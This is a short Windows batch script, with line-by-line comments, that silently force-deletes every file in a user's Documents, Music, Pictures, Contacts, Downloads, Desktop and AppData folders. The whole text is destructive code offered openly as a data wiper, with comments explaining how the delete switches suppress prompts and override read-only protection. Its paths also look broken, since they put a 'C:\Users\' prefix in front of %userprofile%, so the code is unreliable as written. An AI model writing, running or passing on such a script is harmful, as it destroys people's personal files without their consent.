@echo off
del /f /q "C:\Users\%userprofile%\Documents\*.*"
del /f /q "C:\Users\%userprofile%\Music\*.*"
del /f /q "C:\Users\%userprofile%\Pictures\*.*"
del /f /q "C:\Users\%userprofile%\Contacts\*.*"
del /f /q "C:\Users\%userprofile%\Downloads\*.*"
del /f /q "C:\Users\%userprofile%\Desktop\*.*"
del /f /q "C:\Users\%userprofile%\AppData\*.*"

: del means delete.
: /f is a switch, which force deletes the files, if they are read-only.
: /q is a switch, which quietly deletes the files without any prompts.
: *.* to delete all the items in the current directory.